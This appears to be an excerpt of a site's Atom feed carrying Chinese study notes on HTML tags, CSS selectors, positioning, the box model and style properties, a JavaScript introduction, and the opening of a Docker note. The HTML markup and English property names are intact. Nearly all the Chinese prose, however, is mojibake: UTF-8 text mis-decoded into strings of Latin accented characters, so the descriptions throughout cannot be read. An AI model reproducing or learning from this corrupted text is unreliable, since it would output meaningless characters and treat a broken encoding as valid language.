<td><code>&lt;samp&gt;</code></td>
<td>å®šä¹‰è®¡ç®—æœºä»£ç æ ·æœ¬</td>
</tr>
<tr>
<td><code>&lt;var&gt;</code></td>
<td>å®šä¹‰å˜é‡</td>
</tr>
<tr>
<td><code>&lt;pre&gt;</code></td>
<td>å®šä¹‰é¢„æ ¼å¼æ–‡æœ¬</td>
</tr>
</tbody>
</table>
<p><strong>å¼•æ–‡, å¼•ç”¨, åŠæ ‡ç­¾å®šä¹‰</strong></p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;abbr&gt;</code></td>
<td>å®šä¹‰ç¼©å†™</td>
</tr>
<tr>
<td><code>&lt;address&gt;</code></td>
<td>å®šä¹‰åœ°å€</td>
</tr>
<tr>
<td><code>&lt;bdo&gt;</code></td>
<td>å®šä¹‰æ–‡å­—æ–¹å‘</td>
</tr>
<tr>
<td><code>&lt;blockquote&gt;</code></td>
<td>å®šä¹‰é•¿çš„å¼•ç”¨</td>
</tr>
<tr>
<td><code>&lt;q&gt;</code></td>
<td>å®šä¹‰çŸ­çš„å¼•ç”¨è¯­</td>
</tr>
<tr>
<td><code>&lt;cite&gt;</code></td>
<td>å®šä¹‰å¼•ç”¨ã€å¼•è¯</td>
</tr>
<tr>
<td><code>&lt;dfn&gt;</code></td>
<td>å®šä¹‰ä¸€ä¸ªå®šä¹‰é¡¹ç›®ã€‚</td>
</tr>
</tbody>
</table>
<h3 id="ç‰¹ç‚¹åˆ†ç±»" tabindex="-1"> ç‰¹ç‚¹åˆ†ç±»</h3>
<h4 id="å—çº§æ ‡ç­¾" tabindex="-1"> å—çº§æ ‡ç­¾</h4>
<p>å—çº§å…ƒç´ æ˜¯æŒ‡æœ¬èº«å±æ€§ä¸ºdisplay:block;çš„å…ƒç´ ã€‚å› ä¸ºå®ƒè‡ªèº«çš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨å—çº§å…ƒç´ æ¥è¿›è¡Œå¤§å¸ƒå±€ï¼ˆå¤§ç»“æ„ï¼‰çš„æ­å»ºã€‚</p>
<p><strong>ç‰¹ç‚¹</strong></p>
<ul>
<li>ç‹¬å ä¸€è¡Œï¼Œæ¯ä¸€ä¸ªå—çº§å…ƒç´ éƒ½ä¼šä»æ–°çš„ä¸€è¡Œé‡æ–°å¼€å§‹ï¼Œä»ä¸Šåˆ°ä¸‹æ’å¸ƒ</li>
<li>å¯ä»¥ç›´æ¥æ§åˆ¶å®½åº¦ã€é«˜åº¦ä»¥åŠç›’å­æ¨¡å‹çš„ç›¸å…³csså±æ€§</li>
<li>åœ¨ä¸è®¾ç½®å®½åº¦çš„æƒ…å†µä¸‹ï¼Œå—çº§å…ƒç´ çš„å®½åº¦æ˜¯å®ƒçˆ¶çº§å…ƒç´ å†…å®¹çš„å®½åº¦</li>
<li>åœ¨ä¸è®¾ç½®é«˜åº¦çš„æƒ…å†µä¸‹ï¼Œå—çº§å…ƒç´ çš„é«˜åº¦æ˜¯å®ƒæœ¬èº«å†…å®¹çš„é«˜åº¦</li>
</ul>
<p><strong>å¸¸ç”¨å—çº§å…ƒç´ </strong></p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;h1&gt;</code>...<code>&lt;h6&gt;</code></td>
<td>å®šä¹‰æ ‡é¢˜ï¼Œä»h1åˆ°h6å­—ä½“å¤§å°ä¾æ¬¡å‡å°</td>
</tr>
<tr>
<td><code>&lt;p&gt;</code></td>
<td>æ®µè½æ ‡ç­¾</td>
</tr>
<tr>
<td><code>&lt;br&gt;</code></td>
<td>æ¢è¡Œ</td>
</tr>
<tr>
<td><code>&lt;hr&gt;</code></td>
<td>ä¸€æ¡æ°´å¹³ç›´çº¿</td>
</tr>
<tr>
<td><code>&lt;div&gt;</code></td>
<td>å®šä¹‰æ–‡æ¡£ä¸­çš„å„ä¸ªç»“ç‚¹</td>
</tr>
<tr>
<td><code>&lt;menu&gt;</code></td>
<td>èœå•åˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;ol&gt;</code></td>
<td>æœ‰åºåˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;ul&gt;</code></td>
<td>æ— åºåˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;li&gt;</code></td>
<td>åˆ—è¡¨é¡¹</td>
</tr>
<tr>
<td><code>&lt;dl&gt;</code></td>
<td>å®šä¹‰åˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;dt&gt;</code></td>
<td>å®šä¹‰æœ¯è¯­</td>
</tr>
<tr>
<td><code>&lt;dd&gt;</code></td>
<td>å®šä¹‰æè¿°</td>
</tr>
<tr>
<td><code>&lt;table&gt;</code></td>
<td>è¡¨æ ¼</td>
</tr>
<tr>
<td><code>&lt;form&gt;</code></td>
<td>äº¤äº’è¡¨å•</td>
</tr>
</tbody>
</table>
<h4 id="è¡Œå†…æ ‡ç­¾-å†…è”æ ‡ç­¾" tabindex="-1"> è¡Œå†…æ ‡ç­¾(å†…è”æ ‡ç­¾)</h4>
<p>å†…è”å…ƒç´ æ˜¯æŒ‡æœ¬èº«å±æ€§ä¸ºdisplay:inline;çš„å…ƒç´ ã€‚å› ä¸ºå®ƒè‡ªèº«çš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨å—çº§å…ƒç´ æ¥è¿›è¡Œæ–‡å­—ã€å°å›¾æ ‡ï¼ˆå°ç»“æ„ï¼‰çš„æ­å»ºã€‚</p>
<p><strong>ç‰¹ç‚¹</strong></p>
<ul>
<li>å¤šä¸ªè¡Œå†…æ ‡ç­¾èƒ½åŒæ—¶æ˜¾ç¤ºåœ¨ä¸€è¡Œ</li>
<li>ä¸èƒ½ç›´æ¥æ§åˆ¶å®½åº¦ã€é«˜åº¦ä»¥åŠç›’å­æ¨¡å‹çš„ç›¸å…³csså±æ€§ï¼Œä½†æ˜¯ç›´æ¥è®¾ç½®å†…å¤–è¾¹è·çš„å·¦å³å€¼æ˜¯å¯ä»¥çš„</li>
<li>å†…è”å…ƒç´ çš„å®½é«˜æ˜¯ç”±æœ¬èº«å†…å®¹çš„å¤§å°å†³å®šï¼ˆæ–‡å­—ã€å›¾ç‰‡ç­‰ï¼‰</li>
<li>å†…è”å…ƒç´ åªèƒ½å®¹çº³æ–‡æœ¬æˆ–è€…å…¶ä»–å†…è”å…ƒç´ ï¼ˆæ­¤å¤„è¯·æ³¨æ„ï¼Œä¸è¦åœ¨å†…è”å…ƒç´ ä¸­åµŒå¥—å—çº§å…ƒç´ ï¼‰</li>
</ul>
<p><strong>å¸¸ç”¨å†…è”å…ƒç´ </strong></p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>span</td>
<td>å¸¸ç”¨å†…è”å®¹å™¨ï¼Œå®šä¹‰æ–‡æœ¬å†…åŒºå—</td>
</tr>
<tr>
<td>a</td>
<td>é”šç‚¹</td>
</tr>
</tbody>
</table>
<p>ä»¥åŠHTMLæ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾</p>
<h4 id="è¡Œå†…å—å…ƒç´ " tabindex="-1"> è¡Œå†…å—å…ƒç´ </h4>
<p>è¡Œå†…å—å…ƒç´ æŒ‡æœ¬èº«å±æ€§ä¸ºdisplay: inline-block;çš„å…ƒç´ </p>
<p>ç‰¹ç‚¹</p>
<ul>
<li>ä¸ä¼šè‡ªåŠ¨æ¢è¡Œ</li>
<li>èƒ½å¤Ÿè¯†åˆ«å®½é«˜</li>
<li>é»˜è®¤çš„æ’åˆ—é¡ºåºæ˜¯ä»å·¦è‡³å³</li>
</ul>
<h2 id="html-å±æ€§" tabindex="-1"> HTML å±æ€§</h2>
<p>å±æ€§æ˜¯ HTML å…ƒç´ æä¾›çš„é™„åŠ ä¿¡æ¯</p>
<ul>
<li>HTML å…ƒç´ å¯ä»¥è®¾ç½®å±æ€§</li>
<li>å±æ€§å¯ä»¥åœ¨å…ƒç´ ä¸­æ·»åŠ é™„åŠ ä¿¡æ¯</li>
<li>å±æ€§ä¸€èˆ¬æè¿°äºå¼€å§‹æ ‡ç­¾</li>
<li>å±æ€§æ€»æ˜¯ä»¥åç§°/å€¼å¯¹çš„å½¢å¼å‡ºç°ï¼Œæ¯”å¦‚ï¼šname=&quot;value&quot;ã€‚</li>
</ul>
<p>ä¸‹é¢åˆ—å‡ºäº†é€‚ç”¨äºå¤§å¤šæ•° HTML å…ƒç´ çš„å±æ€§ï¼š</p>
<table>
<thead>
<tr>
<th>å±æ€§</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>class</td>
<td>ä¸ºhtmlå…ƒç´ å®šä¹‰ä¸€ä¸ªæˆ–å¤šä¸ªç±»åï¼ˆclassnameï¼‰(ç±»åä»æ ·å¼æ–‡ä»¶å¼•å…¥)</td>
</tr>
<tr>
<td>id</td>
<td>å®šä¹‰å…ƒç´ çš„å”¯ä¸€id</td>
</tr>
<tr>
<td>style</td>
<td>è§„å®šå…ƒç´ çš„è¡Œå†…æ ·å¼ï¼ˆinline styleï¼‰</td>
</tr>
<tr>
<td>title</td>
<td>æè¿°äº†å…ƒç´ çš„é¢å¤–ä¿¡æ¯ (ä½œä¸ºå·¥å…·æ¡ä½¿ç”¨)</td>
</tr>
<tr>
<td>accesskey</td>
<td>è®¾ç½®è®¿é—®å…ƒç´ çš„é”®ç›˜å¿«æ·é”®</td>
</tr>
</tbody>
</table>
<h1 id="css" tabindex="-1"> CSS</h1>
<h2 id="css-ç®€ä»‹" tabindex="-1"> CSS ç®€ä»‹</h2>
<p><strong>CSSå®šä¹‰</strong></p>
<ul>
<li>CSS æŒ‡å±‚å æ ·å¼è¡¨ (Cascading Style Sheets)</li>
<li>æ ·å¼å®šä¹‰å¦‚ä½•æ˜¾ç¤º HTML å…ƒç´ </li>
<li>æ ·å¼é€šå¸¸å­˜å‚¨åœ¨æ ·å¼è¡¨ä¸­</li>
<li>æŠŠæ ·å¼æ·»åŠ åˆ° HTML 4.0 ä¸­ï¼Œæ˜¯ä¸ºäº†è§£å†³å†…å®¹ä¸è¡¨ç°åˆ†ç¦»çš„é—®é¢˜</li>
<li>å¤–éƒ¨æ ·å¼è¡¨å¯ä»¥æå¤§æé«˜å·¥ä½œæ•ˆç‡</li>
<li>å¤–éƒ¨æ ·å¼è¡¨é€šå¸¸å­˜å‚¨åœ¨ CSS æ–‡ä»¶ä¸­</li>
<li>å¤šä¸ªæ ·å¼å®šä¹‰å¯å±‚å ä¸ºä¸€ä¸ª</li>
</ul>
<p><strong>CSSåˆ†ç±»</strong></p>
<ul>
<li>å¤–éƒ¨æ ·å¼è¡¨</li>
<li>å†…è”æ ·å¼è¡¨</li>
<li>å†…è”æ ·å¼</li>
</ul>
<p><strong>å¤šé‡æ ·å¼ä¼˜å…ˆçº§</strong>:
å†…è”æ ·å¼ï¼‰Inline style &gt; ï¼ˆå†…éƒ¨æ ·å¼ï¼‰Internal style sheet &gt;ï¼ˆå¤–éƒ¨æ ·å¼ï¼‰External style sheet &gt; æµè§ˆå™¨é»˜è®¤æ ·å¼</p>
<h2 id="css-ä½¿ç”¨" tabindex="-1"> CSS ä½¿ç”¨</h2>
<h3 id="css-é€‰æ‹©å™¨" tabindex="-1"> CSS é€‰æ‹©å™¨</h3>
<p>id &gt; æ ‡ç­¾ &gt; class</p>
<p><strong>idé€‰æ‹©å™¨</strong>:</p>
<ul>
<li>#æ ‡ç­¾çš„idå±æ€§å€¼{æ ·å¼å1ï¼šæ ·å¼å€¼1;â€¦â€¦}</li>
<li>ä½œç”¨ï¼šç»™æŸä¸ªæŒ‡å®šçš„æ ‡ç­¾æ·»åŠ æŒ‡å®šçš„æ ·å¼</li>
</ul>
<p><strong>æ ‡ç­¾é€‰æ‹©å™¨</strong>ï¼š</p>
<ul>
<li>æ ‡ç­¾å{æ ·å¼å1ï¼šæ ·å¼å€¼1;â€¦â€¦}</li>
<li>ä½œç”¨ï¼šä¼šå°†å½“å‰ç½‘é¡µå†…çš„æ‰€æœ‰è¯¥æ ‡ç­¾å¢åŠ ç›¸åŒçš„æ ·å¼</li>
</ul>
<p><strong>ç±»é€‰æ‹©å™¨</strong>ï¼š</p>
<ul>
<li>.ç±»é€‰æ‹©å™¨å{æ ·å¼å1ï¼šæ ·å¼å€¼1;â€¦â€¦}</li>
<li>ä½œç”¨ï¼šç»™ä¸åŒçš„æ ‡ç­¾æ·»åŠ ç›¸åŒçš„æ ·å¼</li>
</ul>
<p><strong>å…¨éƒ¨é€‰æ‹©é€‰æ‹©å™¨</strong></p>
<ul>
<li>*{æ ·å¼å1ï¼šæ ·å¼å€¼1;â€¦â€¦}</li>
<li>ä½œç”¨ï¼šé€‰æ‹©æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¹¶æ·»åŠ ç›¸åŒçš„æ ·å¼</li>
</ul>
<p><strong>ç»„åˆé€‰æ‹©å™¨</strong></p>
<ul>
<li>é€‰æ‹©å™¨1,é€‰æ‹©å™¨2,â€¦â€¦{æ ·å¼å1ï¼šæ ·å¼å€¼1;â€¦â€¦}</li>
<li>ä½œç”¨ï¼šè§£å†³ä¸åŒçš„é€‰æ‹©å™¨ä¹‹é—´é‡å¤æ ·å¼çš„é—®é¢˜</li>
</ul>
<p><strong>å±æ€§é€‰æ‹©å™¨</strong>ï¼š</p>
<ul>
<li>æ ‡ç­¾å[å±æ€§å=å±æ€§å€¼]{æ ·å¼å1ï¼šæ ·å¼å€¼1;â€¦â€¦}</li>
<li>ä½œç”¨ï¼šé€‰æ‹©æŸæ ‡ç­¾æŒ‡å®šå…·å¤‡æŸå±æ€§å¹¶ä¸”å±æ€§å€¼ä¸ºæŸå±æ€§å€¼çš„æ ‡ç­¾</li>
</ul>
<hr/>
<p><strong>å±‚å é€‰æ‹©å™¨</strong></p>
<ul>
<li>åä»£é€‰æ‹©å™¨(ä»¥ç©ºæ ¼åˆ†éš”):ç”¨äºé€‰å–æŸå…ƒç´ çš„åä»£å…ƒç´ </li>
<li>å­å…ƒç´ é€‰æ‹©å™¨(ä»¥å¤§äºå·åˆ†éš”):åªèƒ½é€‰æ‹©ä½œä¸ºæŸå…ƒç´ å­å…ƒç´ çš„å…ƒç´ </li>
<li>ç›¸é‚»å…„å¼Ÿé€‰æ‹©å™¨ï¼ˆä»¥åŠ å·åˆ†éš”ï¼‰:å¯é€‰æ‹©ç´§æ¥åœ¨å¦ä¸€å…ƒç´ åçš„å…ƒç´ ï¼Œä¸”äºŒè€…æœ‰ç›¸åŒçˆ¶å…ƒç´ ã€‚</li>
<li>æ™®é€šå…„å¼Ÿé€‰æ‹©å™¨ï¼ˆä»¥ç ´æŠ˜å·~åˆ†éš”ï¼‰:é€‰å–æ‰€æœ‰æŒ‡å®šå…ƒç´ ä¹‹åçš„ç›¸é‚»å…„å¼Ÿå…ƒç´ </li>
</ul>
<h3 id="css-å®šä½" tabindex="-1"> CSS å®šä½</h3>
<p>position å±æ€§æŒ‡å®šäº†å…ƒç´ çš„å®šä½ç±»å‹ã€‚</p>
<p>position å±æ€§çš„äº”ä¸ªå€¼ï¼š</p>
<ul>
<li>static
<ul>
<li>HTML å…ƒç´ çš„é»˜è®¤å€¼ï¼Œå³æ²¡æœ‰å®šä½ï¼Œéµå¾ªæ­£å¸¸çš„æ–‡æ¡£æµå¯¹è±¡ã€‚</li>
<li>é™æ€å®šä½çš„å…ƒç´ ä¸ä¼šå—åˆ° top, bottom, left, rightå½±å“ã€‚</li>
</ul>
</li>
<li>relative
<ul>
<li>ç›¸å¯¹å®šä½å…ƒç´ çš„å®šä½æ˜¯ç›¸å¯¹å…¶æ­£å¸¸ä½ç½®ã€‚</li>
<li>ç›¸å¯¹å®šä½å…ƒç´ ç»å¸¸è¢«ç”¨æ¥ä½œä¸ºç»å¯¹å®šä½å…ƒç´ çš„å®¹å™¨å—ã€‚</li>
</ul>
</li>
<li>fixed
<ul>
<li>å…ƒç´ çš„ä½ç½®ç›¸å¯¹äºæµè§ˆå™¨çª—å£æ˜¯å›ºå®šä½ç½®ã€‚</li>
<li>å³ä½¿çª—å£æ˜¯æ»šåŠ¨çš„å®ƒä¹Ÿä¸ä¼šç§»åŠ¨ï¼š</li>
</ul>
</li>
<li>absolute
<ul>
<li>ç»å¯¹å®šä½çš„å…ƒç´ çš„ä½ç½®ç›¸å¯¹äºæœ€è¿‘çš„å·²å®šä½çˆ¶å…ƒç´ ï¼Œå¦‚æœå…ƒç´ æ²¡æœ‰å·²å®šä½çš„çˆ¶å…ƒç´ ï¼Œé‚£ä¹ˆå®ƒçš„ä½ç½®ç›¸å¯¹äº<code>&lt;html&gt;</code></li>
<li>absolute å®šä½ä½¿å…ƒç´ çš„ä½ç½®ä¸æ–‡æ¡£æµæ— å…³ï¼Œå› æ­¤ä¸å æ®ç©ºé—´ã€‚</li>
<li>absolute å®šä½çš„å…ƒç´ å’Œå…¶ä»–å…ƒç´ é‡å ã€‚</li>
</ul>
</li>
<li>sticky
<ul>
<li>åŸºäºç”¨æˆ·çš„æ»šåŠ¨ä½ç½®æ¥å®šä½ã€‚</li>
<li>ç²˜æ€§å®šä½çš„å…ƒç´ æ˜¯ä¾èµ–äºç”¨æˆ·çš„æ»šåŠ¨ï¼Œåœ¨ position:relative ä¸ position:fixed å®šä½ä¹‹é—´åˆ‡æ¢ã€‚</li>
</ul>
</li>
</ul>
<h3 id="ç›’å­æ¨¡å‹" tabindex="-1"> ç›’å­æ¨¡å‹</h3>
<p>æ‰€æœ‰HTMLå…ƒç´ å¯ä»¥çœ‹ä½œç›’å­ï¼Œåœ¨CSSä¸­ï¼Œ&quot;box model&quot;è¿™ä¸€æœ¯è¯­æ˜¯ç”¨æ¥è®¾è®¡å’Œå¸ƒå±€æ—¶ä½¿ç”¨ã€‚</p>
<p>CSSç›’æ¨¡å‹æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç›’å­ï¼Œå°è£…å‘¨å›´çš„HTMLå…ƒç´ ï¼Œå®ƒåŒ…æ‹¬ï¼šè¾¹è·ï¼Œè¾¹æ¡†ï¼Œå¡«å……ï¼Œå’Œå®é™…å†…å®¹ã€‚</p>
<p>ç›’æ¨¡å‹å…è®¸æˆ‘ä»¬åœ¨å…¶å®ƒå…ƒç´ å’Œå‘¨å›´å…ƒç´ è¾¹æ¡†ä¹‹é—´çš„ç©ºé—´æ”¾ç½®å…ƒç´ ã€‚</p>
<p><img src="@source/assets/cs-note/preface/basic/box-model.png" alt="" loading="lazy"></p>
<p>ä¸åŒéƒ¨åˆ†çš„è¯´æ˜ï¼š</p>
<ul>
<li>Margin(å¤–è¾¹è·) - æ¸…é™¤è¾¹æ¡†å¤–çš„åŒºåŸŸï¼Œå¤–è¾¹è·æ˜¯é€æ˜çš„ã€‚</li>
<li>Border(è¾¹æ¡†) - å›´ç»•åœ¨å†…è¾¹è·å’Œå†…å®¹å¤–çš„è¾¹æ¡†ã€‚</li>
<li>Padding(å†…è¾¹è·) - æ¸…é™¤å†…å®¹å‘¨å›´çš„åŒºåŸŸï¼Œå†…è¾¹è·æ˜¯é€æ˜çš„ã€‚</li>
<li>Content(å†…å®¹) - ç›’å­çš„å†…å®¹ï¼Œæ˜¾ç¤ºæ–‡æœ¬å’Œå›¾åƒã€‚</li>
</ul>
<h3 id="å¸¸ç”¨æ ·å¼" tabindex="-1"> å¸¸ç”¨æ ·å¼</h3>
<h4 id="css-background" tabindex="-1"> CSS Background</h4>
<table>
<thead>
<tr>
<th>Property</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>background</td>
<td>ç®€å†™å±æ€§ï¼Œä½œç”¨æ˜¯å°†èƒŒæ™¯å±æ€§è®¾ç½®åœ¨ä¸€ä¸ªå£°æ˜ä¸­ã€‚</td>
</tr>
<tr>
<td>background-attachment</td>
<td>èƒŒæ™¯å›¾åƒæ˜¯å¦å›ºå®šæˆ–è€…éšç€é¡µé¢çš„å…¶ä½™éƒ¨åˆ†æ»šåŠ¨ã€‚</td>
</tr>
<tr>
<td>background-color</td>
<td>è®¾ç½®å…ƒç´ çš„èƒŒæ™¯é¢œè‰²ã€‚</td>
</tr>
<tr>
<td>background-image</td>
<td>æŠŠå›¾åƒè®¾ç½®ä¸ºèƒŒæ™¯ã€‚</td>
</tr>
<tr>
<td>background-position</td>
<td>è®¾ç½®èƒŒæ™¯å›¾åƒçš„èµ·å§‹ä½ç½®ã€‚</td>
</tr>
<tr>
<td>background-repeat</td>
<td>è®¾ç½®èƒŒæ™¯å›¾åƒæ˜¯å¦åŠå¦‚ä½•é‡å¤ã€‚</td>
</tr>
</tbody>
</table>
<h4 id="css-text" tabindex="-1"> CSS Text</h4>
<table>
<thead>
<tr>
<th>å±æ€§</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>color</td>
<td>è®¾ç½®æ–‡æœ¬é¢œè‰²</td>
</tr>
<tr>
<td>direction</td>
<td>è®¾ç½®æ–‡æœ¬æ–¹å‘ã€‚</td>
</tr>
<tr>
<td>letter-spacing</td>
<td>è®¾ç½®å­—ç¬¦é—´è·</td>
</tr>
<tr>
<td>line-height</td>
<td>è®¾ç½®è¡Œé«˜</td>
</tr>
<tr>
<td>text-align</td>
<td>å¯¹é½å…ƒç´ ä¸­çš„æ–‡æœ¬</td>
</tr>
<tr>
<td>text-decoration</td>
<td>å‘æ–‡æœ¬æ·»åŠ ä¿®é¥°</td>
</tr>
<tr>
<td>text-indent</td>
<td>ç¼©è¿›å…ƒç´ ä¸­æ–‡æœ¬çš„é¦–è¡Œ</td>
</tr>
<tr>
<td>text-shadow</td>
<td>è®¾ç½®æ–‡æœ¬é˜´å½±</td>
</tr>
<tr>
<td>text-transform</td>
<td>æ§åˆ¶å…ƒç´ ä¸­çš„å­—æ¯</td>
</tr>
<tr>
<td>unicode-bidi</td>
<td>è®¾ç½®æˆ–è¿”å›æ–‡æœ¬æ˜¯å¦è¢«é‡å†™</td>
</tr>
<tr>
<td>vertical-align</td>
<td>è®¾ç½®å…ƒç´ çš„å‚ç›´å¯¹é½</td>
</tr>
<tr>
<td>white-space</td>
<td>è®¾ç½®å…ƒç´ ä¸­ç©ºç™½çš„å¤„ç†æ–¹å¼</td>
</tr>
<tr>
<td>word-spacing</td>
<td>è®¾ç½®å­—é—´è·</td>
</tr>
</tbody>
</table>
<h4 id="css-fonts" tabindex="-1"> CSS Fonts</h4>
<table>
<thead>
<tr>
<th>Property</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>font</td>
<td>åœ¨ä¸€ä¸ªå£°æ˜ä¸­è®¾ç½®æ‰€æœ‰çš„å­—ä½“å±æ€§</td>
</tr>
<tr>
<td>font-family</td>
<td>æŒ‡å®šæ–‡æœ¬çš„å­—ä½“ç³»åˆ—</td>
</tr>
<tr>
<td>font-size</td>
<td>æŒ‡å®šæ–‡æœ¬çš„å­—ä½“å¤§å°</td>
</tr>
<tr>
<td>font-style</td>
<td>æŒ‡å®šæ–‡æœ¬çš„å­—ä½“æ ·å¼</td>
</tr>
<tr>
<td>font-variant</td>
<td>ä»¥å°å‹å¤§å†™å­—ä½“æˆ–è€…æ­£å¸¸å­—ä½“æ˜¾ç¤ºæ–‡æœ¬ã€‚</td>
</tr>
<tr>
<td>font-weight</td>
<td>æŒ‡å®šå­—ä½“çš„ç²—ç»†ã€‚</td>
</tr>
</tbody>
</table>
<h4 id="css-link" tabindex="-1"> CSS Link</h4>
<p>é“¾æ¥çš„æ ·å¼ï¼Œå¯ä»¥ç”¨ä»»ä½•CSSå±æ€§ï¼ˆå¦‚é¢œè‰²ï¼Œå­—ä½“ï¼ŒèƒŒæ™¯ç­‰ï¼‰ã€‚</p>
<p>ç‰¹åˆ«çš„é“¾æ¥ï¼Œå¯ä»¥æœ‰ä¸åŒçš„æ ·å¼ï¼Œè¿™å–å†³äºä»–ä»¬æ˜¯ä»€ä¹ˆçŠ¶æ€ã€‚</p>
<p>è¿™å››ä¸ªé“¾æ¥çŠ¶æ€æ˜¯ï¼š</p>
<ul>
<li>a:link - æ­£å¸¸ï¼Œæœªè®¿é—®è¿‡çš„é“¾æ¥</li>
<li>a:visited - ç”¨æˆ·å·²è®¿é—®è¿‡çš„é“¾æ¥</li>
<li>a:hover - å½“ç”¨æˆ·é¼ æ ‡æ”¾åœ¨é“¾æ¥ä¸Šæ—¶</li>
<li>a:active - é“¾æ¥è¢«ç‚¹å‡»çš„é‚£ä¸€åˆ»</li>
</ul>
<h4 id="cssåˆ—è¡¨" tabindex="-1"> CSSåˆ—è¡¨</h4>
<table>
<thead>
<tr>
<th>å±æ€§</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>list-style</td>
<td>ç®€å†™å±æ€§ã€‚ç”¨äºæŠŠæ‰€æœ‰ç”¨äºåˆ—è¡¨çš„å±æ€§è®¾ç½®äºä¸€ä¸ªå£°æ˜ä¸­</td>
</tr>
<tr>
<td>list-style-image</td>
<td>å°†å›¾è±¡è®¾ç½®ä¸ºåˆ—è¡¨é¡¹æ ‡å¿—ã€‚</td>
</tr>
<tr>
<td>list-style-position</td>
<td>è®¾ç½®åˆ—è¡¨ä¸­åˆ—è¡¨é¡¹æ ‡å¿—çš„ä½ç½®ã€‚</td>
</tr>
<tr>
<td>list-style-type</td>
<td>è®¾ç½®åˆ—è¡¨é¡¹æ ‡å¿—çš„ç±»å‹ã€‚</td>
</tr>
</tbody>
</table>
<h1 id="javascript" tabindex="-1"> JavaScript</h1>
<h2 id="javascript-ç®€ä»‹" tabindex="-1"> JavaScript ç®€ä»‹</h2>
<p>JavaScript æ˜¯ä¸€ç§è„šæœ¬ï¼Œä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒå¯ä»¥åœ¨ç½‘é¡µä¸Šå®ç°å¤æ‚çš„åŠŸèƒ½ï¼Œç½‘é¡µå±•ç°ç»™ä½ çš„ä¸å†æ˜¯ç®€å•çš„é™æ€ä¿¡æ¯ï¼Œè€Œæ˜¯å®æ—¶çš„å†…å®¹æ›´æ–°ã€‚</p>
<p><strong>JavaScriptè¯­è¨€çš„ä»‹ç»</strong>ï¼šJavaScriptæ˜¯åŸºäºå¯¹è±¡å’ŒåŸå‹çš„ä¸€ç§åŠ¨æ€ã€å¼±ç±»å‹çš„è„šæœ¬è¯­è¨€</p>
<p><strong>JavaScriptè¯­è¨€çš„ç»„æˆ</strong>ï¼šJavaScriptæ˜¯ç”±æ ¸å¿ƒè¯­æ³•(ECMAScript)ã€æ–‡æ¡£å¯¹è±¡æ¨¡å‹(DOM)ã€æµè§ˆå™¨å¯¹è±¡æ¨¡å‹(BOM)ç»„æˆçš„</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€è§£å†³çš„é—®é¢˜</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Docker.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Docker.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="ä¸€ã€è§£å†³çš„é—®é¢˜" tabindex="-1"> ä¸€ã€è§£å†³çš„é—®é¢˜</h1>
<p>ç”±äºä¸åŒçš„æœºå™¨æœ‰ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œä»¥åŠä¸åŒçš„åº“å’Œç»„ä»¶ï¼Œåœ¨å°†ä¸€ä¸ªåº”ç”¨éƒ¨ç½²åˆ°å¤šå°æœºå™¨ä¸Šéœ€è¦è¿›è¡Œå¤§é‡çš„ç¯å¢ƒé…ç½®æ“ä½œã€‚</p>
<p>Docker ä¸»è¦è§£å†³ç¯å¢ƒé…ç½®é—®é¢˜ï¼Œå®ƒæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œéš”ç¦»ï¼Œè¢«éš”ç¦»çš„è¿›ç¨‹ç‹¬ç«‹äºå®¿ä¸»æ“ä½œç³»ç»Ÿå’Œå…¶å®ƒéš”ç¦»çš„è¿›ç¨‹ã€‚ä½¿ç”¨ Docker å¯ä»¥ä¸ä¿®æ”¹åº”ç”¨ç¨‹åºä»£ç ï¼Œä¸éœ€è¦å¼€å‘äººå‘˜å­¦ä¹ ç‰¹å®šç¯å¢ƒä¸‹çš„æŠ€æœ¯ï¼Œå°±èƒ½å¤Ÿå°†ç°æœ‰çš„åº”ç”¨ç¨‹åºéƒ¨ç½²åœ¨å…¶å®ƒæœºå™¨ä¸Šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/011f3ef6-d824-4d43-8b2c-36dab8eaaa72-1.png" width="400px"/> </div><br>
<h1 id="äºŒã€ä¸è™šæ‹Ÿæœºçš„æ¯”è¾ƒ" tabindex="-1"> äºŒã€ä¸è™šæ‹Ÿæœºçš„æ¯”è¾ƒ</h1>
